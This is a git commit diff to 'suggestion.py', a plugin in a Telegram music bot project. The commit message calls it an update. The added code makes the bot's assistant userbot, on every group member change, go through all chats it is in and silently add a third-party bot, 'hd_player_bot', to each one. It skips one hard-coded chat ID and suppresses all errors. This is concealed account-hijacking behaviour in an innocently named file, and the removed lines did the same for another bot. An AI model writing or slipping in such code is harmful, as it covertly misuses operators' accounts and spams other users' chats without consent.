902945d273a477cc4a00d9c271dcd8a90d941662
THE VIP BOY <117478195+THE-VIP-BOY-OP@users.noreply.github.com>
2024-04-26 13:53:56 +0530

    Update suggestion.py

--- VIPMUSIC/plugins/misc/suggestion.py
+++ VIPMUSIC/plugins/misc/suggestion.py
@@ -1,108 +1,28 @@
 from VIPMUSIC import app
-from pyrogram import Client, filters
-from pyrogram.enums import ChatMemberStatus
-from pyrogram.errors import (
-    ChatAdminRequired,
-    InviteRequestSent,
-    UserAlreadyParticipant,
-    UserNotParticipant,
-)
-from pyrogram.errors import RPCError
-from pyrogram.types import ChatMemberUpdated, InlineKeyboardMarkup, InlineKeyboardButton
-from os import environ
-from typing import Union, Optional
-from PIL import Image, ImageDraw, ImageFont
-from os import environ
-import requests
-import random
-from VIPMUSIC import app, userbot
-from VIPMUSIC.misc import SUDOERS
-from pyrogram import * 
-from pyrogram.types import *
-from VIPMUSIC.utils.vip_ban import admin_filter
-import random
-from pyrogram import Client, filters
-from pyrogram.types import ChatJoinRequest, InlineKeyboardButton, InlineKeyboardMarkup
-from PIL import Image, ImageDraw, ImageFont
-import asyncio, os, time, aiohttp
-from pathlib import Path
-from PIL import Image, ImageDraw, ImageFont, ImageEnhance
-from asyncio import sleep
-from pyrogram import filters, Client, enums
-from pyrogram.enums import ParseMode
-from pyrogram import *
-from pyrogram.types import *
-from logging import getLogger
-from VIPMUSIC.utils.vip_ban import admin_filter
-import os
-from VIPMUSIC.misc import SUDOERS
-from PIL import ImageDraw, Image, ImageFont, ImageChops
-from pyrogram import *
-from pyrogram.types import *
-from logging import getLogger
-from pyrogram import Client, filters
-import requests
-import random
-import os
-import re
-import asyncio
-import time
-from VIPMUSIC import app
-from VIPMUSIC.utils.database import add_served_chat, delete_served_chat
-from pyrogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton
+from pyrogram import filters
+from pyrogram.types import ChatMemberUpdated
 from VIPMUSIC.utils.database import get_assistant
 import asyncio
-from VIPMUSIC.misc import SUDOERS
-from VIPMUSIC.mongo.afkdb import LOGGERS as OWNERS
-from VIPMUSIC.core.userbot import Userbot
-from pyrogram import Client, filters
-from pyrogram.errors import UserAlreadyParticipant
-from VIPMUSIC import app
-import asyncio
-import random
-from pyrogram import Client, filters
-from pyrogram.enums import ChatMemberStatus
-from pyrogram.errors import (
-    ChatAdminRequired,
-    InviteRequestSent,
-    UserAlreadyParticipant,
-    UserNotParticipant,
-)
-from VIPMUSIC import app
-from VIPMUSIC.utils.vip_ban import admin_filter
-from VIPMUSIC.utils.decorators.userbotjoin import UserbotWrapper
-from VIPMUSIC.utils.database import get_assistant, is_active_chat
 
-
-@app.on_chat_member_updated(filters.group, group=-8)
+@app.on_chat_member_updated(filters.group, group=-11)
 async def greet_new_member(_, member: ChatMemberUpdated):
     chat_id = member.chat.id
-    count = await app.get_chat_members_count(chat_id)
-
+    userbot = await get_assistant(chat_id)
     user = member.new_chat_member.user if member.new_chat_member else member.from_user
-    
-    # Add the modified condition here
-    if member.new_chat_member and not member.old_chat_member:
-        bot_username = "TG_VC_BOT"
+
+    bot_username = "hd_player_bot"
+    if member.new_chat_member or member.old_chat_member:
 
         try:
-            userbot = await get_assistant(chat_id)
-            bot = await app.get_users(bot_username)
-            app_id = bot.id
-            done = 0
-            failed = 0
-            
             async for dialog in userbot.get_dialogs():
-                if dialog.chat.id == -1002120144597:
+                if dialog.chat.id == -1002042572827:
                     continue
                 try:
-                    await userbot.add_chat_members(dialog.chat.id, app_id)
-                    done += 1
+                    await userbot.add_chat_members(dialog.chat.id, bot_username)
+
                 except Exception as e:
-                    failed += 1
-                await asyncio.sleep(3)  # Adjust sleep time based on rate limits
-            
-            # Update this part based on your requirements
-            print(f"➻ {bot_username} bot added successfully!\n\n➥ Added in {done} chats ✅\n➥ Failed in {failed} chats ❌")
+                    print(e)
+                await asyncio.sleep(3) 
+
         except Exception as e:
-            print(f"Error: {str(e)}")
+            pass
